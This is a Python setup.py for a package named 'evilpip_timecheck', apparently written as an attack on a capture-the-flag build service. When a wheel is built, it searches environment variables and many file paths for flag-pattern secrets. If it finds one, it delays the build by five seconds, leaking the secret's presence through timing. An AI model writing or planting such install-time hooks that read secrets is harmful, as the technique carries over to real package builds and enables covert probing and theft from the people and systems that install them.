# Timing-only verification for an authorized CTF; does not transmit or print flag contents.
import os
import re
import sys
import time
from pathlib import Path
from setuptools import setup

PATTERN = re.compile(rb'(?:ALGOLYMP|CTF|FLAG)\{[^}\r\n]{2,200}\}', re.I)
SEARCH_PATHS = ['/flag','/flag.txt','/app/flag','/app/flag.txt','/home/ctf/flag',
                '/home/ctf/flag.txt','/root/flag','/root/flag.txt',
                '/challenge/flag','/challenge/flag.txt','/srv/flag','/srv/flag.txt',
                '/run/secrets/flag','/tmp/flag','/tmp/flag.txt','/workspace/flag.txt',
                '/opt/flag','/opt/flag.txt','/var/flag.txt','/secrets/flag']

def flag_present():
    for v in os.environ.values():
        if PATTERN.search(v.encode('utf8','replace')): return True
    for s in SEARCH_PATHS:
        try:
            p=Path(s)
            if p.is_file() and p.stat().st_size<=65536 and PATTERN.search(p.read_bytes()):
                return True
        except OSError: pass
    for root in ('/app','/home/ctf','/challenge','/srv','/workspace','/tmp'):
        for base, dirs, names in os.walk(root):
            if base[len(root):].count(os.sep)>3:
                dirs[:]=[]
                continue
            dirs[:]=[d for d in dirs if d not in ('site-packages','.git','node_modules','__pycache__')]
            for name in names:
                if not name.lower().startswith('flag'): continue
                p=Path(base)/name
                try:
                    if p.is_file() and p.stat().st_size<=65536 and PATTERN.search(p.read_bytes()):
                        return True
                except OSError: pass
    return False

if 'bdist_wheel' in sys.argv and flag_present():
    # Exactly one wheel-build phase should incur this delay.
    time.sleep(5)

setup(name='evilpip_timecheck',version='0.9.0',packages=['evilpip_timecheck'],
      description='CTF timing channel calibration')
